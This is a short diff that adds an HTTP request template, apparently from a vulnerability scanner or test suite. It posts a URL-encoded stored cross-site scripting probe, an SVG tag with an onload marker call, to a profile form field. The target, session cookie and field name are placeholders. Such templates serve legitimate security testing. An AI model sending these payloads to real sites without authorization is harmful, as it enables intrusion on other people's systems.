@@ -1,0 +1,5 @@
+POST {{TARGET}}/profile HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Cookie: {{SESSION}}
+
+{{SIG_FIELD}}=%3Csvg%20onload%3DVULNXSS_V1()%3E
